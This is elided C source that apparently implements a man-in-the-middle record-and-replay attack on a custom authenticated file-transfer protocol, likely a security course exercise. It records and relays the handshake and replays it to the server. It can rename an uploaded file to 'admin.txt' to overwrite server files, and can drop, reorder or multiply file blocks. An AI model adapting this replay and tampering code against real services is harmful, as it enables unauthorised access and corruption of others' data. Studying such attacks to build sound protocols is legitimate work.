...
int client_authenticate( int sock, unsigned char **session_key )
{
    ...
    *session_key = (unsigned char *) malloc(session_key_length);
    ...
    /*Message 4 - Wait to receive the confirmation*/
...
int receive_file( int sock, unsigned char *key ) 
{
	...
	if ( r->type == TYP_DATA_SHARED ) {
		...
		if ( (fh=open( basename(fname), O_WRONLY|O_CREAT|O_TRUNC, 0700)) > 0 );
		else assert( 0 );
	}
	else assert( 0 );
...
int server_secure_transfer( char *privfile, char *pubfile, char *real_address )
{
	...
	while ( !errored )
	{
		...
		else
		{
			...
			{
				printf("Start of Client-MiTM transfer.\n");
				...
				/*
				The file is copied in the project directory for the MiTM, I changed the receive_file function:
					"if ( (fh=open( basename(fname), O_WRONLY|O_CREAT|O_TRUNC, 0700)) > 0 );"
				I send it in the ./shared folder of the real server though.
				*/

				printf("End of Client-MiTM transfer, start MiTM-Server transfer.\n");
				...
				if (err == -1) {
					printf("server_secure_transfer, make_req_struct returned -1.\n" );
					return -1;
				}
				err = client_secure_transfer(r, basename(new_filename), real_address);
				if (err == -1) {
					printf("server_secure_transfer, client_secure_transfer returned -1.\n" );
					return -1;
				}
				printf("End of MiTM-Server transfer.\n");
...
/**********************************************************************
    ...
    Some definition to manipulate the list of messages sent by the
    client during the record part of the attack.
    We record the following messages.
    message1: CLIENT_INIT_EXCHANGE
    massage3: CLIENT_INIT_ACK
    message5: FILE_XFERT_INIT
    message7: EXIT
...
void append(struct msg *new_msg) {
	if (msg_head == NULL){
		msg_head = msg_tail = new_msg;
   		new_msg->next = NULL;
	}
	else{
...
int mim_record_auth( int server_sock, int client_sock )
{

	/* Message 1 - Wait patiently for the client to contact us*/
	struct msg *message1 = NULL;
	message1 = (struct msg*) malloc(sizeof(struct msg));

    ProtoMessageHdr hdr1;
    char block1[MAX_BLOCK_SIZE];
    bzero(block1, MAX_BLOCK_SIZE); //clear 
    if (wait_message( server_sock, &hdr1, block1, CLIENT_INIT_EXCHANGE ) == -1){
        printf("mim_record_auth Message 1 error.\n");
        return -1;
    }
    memcpy(message1 -> message, block1, MAX_BLOCK_SIZE);
    message1 -> hdr = hdr1;
    append(message1);
    
    /* Message 1 Relay*/    
    // relay block1 containing actually nothing
    if(send_message(client_sock, &hdr1, block1) == -1){
        printf("mim_record_auth Message 1 relay error.\n");
        return -1;
    }

    /*Message 2 - Wait to receive the RSA pub key of the server*/
    ProtoMessageHdr hdr2;
    char block2[MAX_BLOCK_SIZE]; // will contain the rsapublic key non-extracted
    bzero(block2, MAX_BLOCK_SIZE); //clear 
    if (wait_message(client_sock, &hdr2, block2, SERVER_INIT_RESPONSE ) == -1){
        printf("mim_record_auth Message 2 error.\n");
        return -1;
    }

    /* Message 2 Relay*/    
    if(send_message(server_sock, &hdr2, block2) == -1){
        printf("mim_record_auth Message 2 relay error.\n");
        return -1;
    }

	/* Message 3 - Wait for the client to send the encrypted session key */
	struct msg *message3 = NULL;
	message3 = (struct msg*) malloc(sizeof(struct msg));
    ProtoMessageHdr hdr3;
    char block3[MAX_BLOCK_SIZE];
    bzero(block3, MAX_BLOCK_SIZE); //clear 
    if (wait_message(server_sock, &hdr3, block3, CLIENT_INIT_ACK ) == -1){
        printf("mim_record_auth Message 3 error.\n");
        return -1;
    }
    memcpy(message3 -> message, block3, MAX_BLOCK_SIZE);
    message3 -> hdr = hdr3;
    append(message3);
    
    /* Message 3 Relay*/    
    if(send_message(client_sock, &hdr3, block3) == -1){
        printf("mim_record_auth Message 3 relay error.\n");
        return -1;
    }

    /*Message 4 - Wait to receive the confirmation from the server*/
    ProtoMessageHdr hdr4;
    unsigned char E_epoch[MAX_BLOCK_SIZE]; // will contain the confirmation (encrypted epoch) if the protocol went well
    bzero(E_epoch, MAX_BLOCK_SIZE); //clear 
    if (wait_message(client_sock, &hdr4, E_epoch, SERVER_INIT_ACK ) == -1){
        printf("mim_record_auth Message 4 error.\n");
        return -1;
    }

    /* Message 4 Relay*/    
    if(send_message(server_sock, &hdr4, E_epoch) == -1){
        printf("mim_record_auth Message 3 relay error.\n");
        return -1;
    }
...
int mim_record_file_and_exit( int server_sock, int client_sock, char *fname, struct rm_cmd *r)
{
	/* Local variables */
	int totalBytes = 0;
	int done = 0, fh = 0;
	...
	if ( r->cmd == CMD_CREATE ) {
		...
		{
			/* Wait message, then check length */
			get_message( server_sock, &hdr, block );
			if ( hdr.msgtype == EXIT ) { 
			// the exit message has been received, we replay the exit part of the protocol
				/*Record the EXIT msg from the client*/
				struct msg *message7 = NULL;
				message7 = (struct msg*) malloc(sizeof(struct msg));
				memcpy(message7 -> message, block, MAX_BLOCK_SIZE);
			    message7 -> hdr = hdr;
			    append(message7);

			    /*Relay the EXIT message from the client*/
			    if(send_message( client_sock, &hdr, block ) == -1){
					printf("mim_record_file_and_exit, relay client EXIT error.\n");
					return -1;
				}

				/* Wait for server reply */
				char block[MAX_BLOCK_SIZE];
				if (wait_message( client_sock, &hdr, block, EXIT ) == -1){
					printf("mim_record_file_and_exit, server EXIT error.\n");
					return -1;
				}

				/* Relay server EXIT msg */
				hdr.msgtype = EXIT;
				hdr.length = 0;
				if(send_message( server_sock, &hdr, block ) == -1){
					printf("mim_record_file_and_exit, relay server EXIT error.\n");
					return -1;
				}
			...
			else //We write the file on disk and relay the file data
			{
				/*Record file on disk*/
				write( fh, block, hdr.length ); // write to file.
				totalBytes += hdr.length;
				printf( "Received/written %ld bytes ...\n", totalBytes );

				/* Relay file to the server */
				if(send_message(client_sock, &hdr, block) == -1){
	                printf("mim_record_file_and_exit FILE_XFER_BLOCK error.\n");
	                return -1;
	            }
...
int mim_replay_auth( int client_sock ){
	struct msg *message1 = msg_head;
	struct msg *message3 = message1 -> next;
    ProtoMessageHdr hdr;
    char block[MAX_BLOCK_SIZE]; // will contain the responses from the server
    bzero(block, MAX_BLOCK_SIZE); //clear 


	/* Message 1 - Replay*/
    if(send_message(client_sock, &(message1->hdr), message1->message) == -1){
        printf("mim_replay_auth Message 1 replay error.\n");
        return -1;
    }

    /*Message 2 - Wait to receive the RSA pub key of the server, but do nothing*/
    if (wait_message(client_sock, &hdr, block, SERVER_INIT_RESPONSE ) == -1){
        printf("mim_replay_auth Message 2 response error.\n");
        return -1;
    }

	/* Message 3 - Replay */
    if(send_message(client_sock, &(message3->hdr), message3->message) == -1){
        printf("mim_replay_auth Message 3 replay error.\n");
        return -1;
    }

    /*Message 4 - Wait to receive the confirmation from the server*/
    bzero(block, MAX_BLOCK_SIZE); //clear 
    if (wait_message(client_sock, &hdr, block, SERVER_INIT_ACK ) == -1){
        printf("mim_replay_auth Message 4 response error.\n");
        return -1;
    }
...
int mim_transfert_modif_file( int client_sock, char* fname, struct rm_cmd *r , int reorder_option)
{
	/* Local variables */
	int readBytes = 1, totalBytes = 0, fh;
	ProtoMessageHdr hdr;
	char block[MAX_BLOCK_SIZE];
	int block_nb = 1; // For reorder_option == 1 
	...
	// read one block if reorder_option == 2
	char block_prev[MAX_BLOCK_SIZE]; // For reorder_option == 2
	int readBytes_prev = 1; // For reorder_option == 2
	if (reorder_option == 2){
		if ( (readBytes=read( fh, block, BLOCKSIZE + TAGSIZE + 16)) == -1 )
			{
				/* Complain, explain, and exit */
				errorMessage( "failed read on data file.\n" );
				exit( -1 );
	...
	// For reorder option 3 - check the file size first
	int block_rand = 0;
	int nb_block_sent = 0;
	int scale_factor = 10; // we send 10 times more data...
	FILE *file = NULL;
    int file_size = 0;
	...
	// hdr.msgtype = FILE_XFER_INIT;
	// hdr.length = sizeof(struct rm_cmd) + r->len;
	// send_message( client_sock, &hdr, (char *)r );

	/* Start transferring data */
	while ( (r->cmd == CMD_CREATE) && (readBytes != 0) )
	{
		/*Transfert the file without change of content (filename can be modified...)*/
		if (reorder_option == 0){
			/* Read the next block */
			if ( (readBytes=read( fh, block, BLOCKSIZE + TAGSIZE + 16)) == -1 )
			{
			...
			{   
	            ...
	            ProtoMessageHdr hdr;
	            hdr.msgtype = FILE_XFER_BLOCK;
	            hdr.length = readBytes;

	            if(send_message(client_sock, &hdr, block) == -1){
	                printf("mim_transfert_modif_file FILE_XFER_BLOCK error.\n");
	                return -1;
	            }
	        }
	    }

	    /*Transfert the file without 1st block (filename can be modified too...)*/
		if (reorder_option == 1){
			/* Read the next block */
			if ( (readBytes=pread(fh, block, BLOCKSIZE + TAGSIZE + 16, (BLOCKSIZE + TAGSIZE + 16)*block_nb)) == -1 )
			{
				/* Complain, explain, and exit */
				errorMessage( "failed read on data file.\n" );
				exit( -1 );
	   	...
	   	/*Transfert the file without last block (filename can be modified too...)*/
		if (reorder_option == 2){
			/* Read the next block */
	        memcpy(block_prev, block, MAX_BLOCK_SIZE);
	        readBytes_prev = readBytes;
			if ( (readBytes=read( fh, block, BLOCKSIZE + TAGSIZE + 16)) == -1 )
			{
				/* Complain, explain, and exit */
				errorMessage( "failed read on data file.\n" );
			...
			{   
	            ...
	            ProtoMessageHdr hdr;
	            hdr.msgtype = FILE_XFER_BLOCK;
	            hdr.length = readBytes_prev;

	            if(send_message(client_sock, &hdr, block_prev) == -1){
	                printf("mim_transfert_modif_file FILE_XFER_BLOCK error.\n");
	                return -1;
	            } 
	        }
	   	...
	   	/*Transfert 10x more data and in disorder (filename can be modified too...)*/
		if (reorder_option == 3){
			block_rand = rand() % (file_size / (BLOCKSIZE + TAGSIZE + 16));
			/* Read the next block */
			if ( (readBytes=pread(fh, block, BLOCKSIZE + TAGSIZE + 16, (BLOCKSIZE + TAGSIZE + 16)*block_rand)) == -1 )
			{
				/* Complain, explain, and exit */
				errorMessage( "failed read on data file.\n" );
				exit( -1 );
	        ...
	        nb_block_sent += 1;
	        if(nb_block_sent*(BLOCKSIZE + TAGSIZE + 16) > scale_factor * file_size){ //stop sending...
				readBytes = 0;
	        }
	    }
	...
	//Exit replay - message7 replay
    if(send_message(client_sock, &(msg_tail->hdr), msg_tail->message) == -1){
        printf("mim_transfert_modif_file EXIT message 7 replay error.\n");
        return -1;
    } 

	/* Wait for server reply */
	if (wait_message( client_sock, &hdr, block, EXIT ) == -1){
		printf("mim_transfert_modif_file, EXIT message 7 response error.\n");
		return -1;
	}
...
int mim_record_and_replay( char *real_address )
{
	/* MiM Replay attack settings*/
	int change_name = 1; // Should the MiM change the filename ? (Good for overwriting file on server)
	int reorder_option = 3; // Should the adversary change the order of the blocks in the file ? (Good for messing up the file)
	// 0 - Send the file without modifications
	// 1 - Delete first block
	// 2 - Delete last block
	// 3 - Send a file 10 times bigger (and all blocks in disorder) than the one sent by the client
	char mim_name[] = "admin.txt"; // new filename (applied if change_name == 1)
	/*End settings*/

	if (reorder_option > 3 || reorder_option < 0){
		printf("Invalid reorder_option.\n");
		return -1;
	}
	...
	int mim_name_len = sizeof(mim_name);
	...
	//------------ RECORD & RELAY INIT
	//Create the socket for the server side of the MiM (client to MiM)
	server = server_connect();
	if ( (server_sock = server_accept(server)) == -1){
		printf("mim_record_and_replay, server side of MiM couldn't be created.\n");
		return -1;
	}

	//Create the socket for the client side of the MiM (MiM to server)
	client_sock = connect_client( real_address );
	printf("MiM server and client side started succesfully...\n");


	//------------ RECORD & RELAY AUTHENTICATION
	//Start recording and relaying the authentiction part of the protocol.
	rc = mim_record_auth(server_sock, client_sock);
	if(rc == -1){
		printf("mim_record_and_replay, record authentication failed.\n");
		return -1;
	}
	printf("Authentication recorded succesfully.\n");

	//------------ RECORD & RELAY FILE TRANSFERT - Init
	ProtoMessageHdr hdr;
	struct rm_cmd *r = NULL;
	char block[MAX_BLOCK_SIZE];
	char *fname = NULL;
	...
	/* clear */
	bzero(block, MAX_BLOCK_SIZE);
	/* Receive the init message and record it (Message 5)*/
	if(wait_message( server_sock, &hdr, block, FILE_XFER_INIT ) == -1){
		printf("mim_record_and_replay Message 5 error.\n");
        return -1;
	}
	struct msg *message5 = NULL;
	message5 = (struct msg*) malloc(sizeof(struct msg));
	memcpy(message5 -> message, (struct rm_cmd *)block, MAX_BLOCK_SIZE);
    message5 -> hdr = hdr;
    append(message5);

    /* Message 5 Relay*/    
    if(send_message(client_sock, &hdr, block) == -1){
        printf("mim_record_and_replay Message 5 relay error.\n");
        return -1;
    }
	...
	/* change filename fname */
	unsigned int size = r->len + strlen(FILE_PREFIX) + 1;
	fname = (char *)malloc( size );
	snprintf( fname, size, "%s%.*s", FILE_PREFIX, (int) r->len, r->fname );

	//------------ RECORD & RELAY FILE TRANSFERT AND EXIT - record on HD
	rc = mim_record_file_and_exit( server_sock, client_sock, fname, r );
	if(rc == -1){
		printf("mim_record_and_replay, mim_record_file_and_exit failed.\n");
		return -1;
	} 
	// up to this point the client finished transfering the file.
	printf("File recorded and transfered to the server as is.\n");
	...
	//------------ REPLAY INIT
	client_sock2 = connect_client( real_address );

	//------------ REPLAY AUTHENTICATION
	//Create the socket for the client side of the MiM (MiM to server)
	rc = mim_replay_auth( client_sock2 );
	if(rc == -1){
		printf("mim_record_and_replay, mim_replay_auth failed.\n");
		return -1;
	}
	printf("Authentication replayed succesfully.\n");

	//------------ REPLAY FILE TRANSFERT - Init
    /* Message 5 Replay*/
    struct rm_cmd *r2 = NULL;
    r2 = (struct rm_cmd *)malloc( sizeof(struct rm_cmd) + mim_name_len );
    r2->cmd = ((struct rm_cmd *) message5->message)->cmd;
    r2->type = ((struct rm_cmd *)message5->message)->type;
    if (change_name == 1){
    	r2->len = mim_name_len;
		memcpy( r2->fname, mim_name, mim_name_len );
	}
	else{
		r2->len = ((struct rm_cmd *)message5->message)->len;
		memcpy( r2->fname, ((struct rm_cmd *)message5->message)->fname, r2->len );
	}

    if(send_message(client_sock2, &(message5->hdr), (char*) r2) == -1){
        printf("mim_record_and_replay Message 5 relay error.\n");
        return -1;
    }

    //------------ REPLAY FILE TRANSFERT - transfer to server

	rc = mim_transfert_modif_file( client_sock2, fname, r , reorder_option); // send file with modifications
	if(rc == -1){
		printf("mim_record_and_replay, mim_transfert_modif_file failed.\n");
		return -1;
	}
	printf("Replay attack successful.\n");
	
	//------------ RECORD & RELAY END
	//Free stuff
	free(msg_head->next);//message 3
	free(msg_head);//message 2
	free(message5);
	free(message5->next); // message 7
	msg_head = NULL;
	msg_tail = NULL;
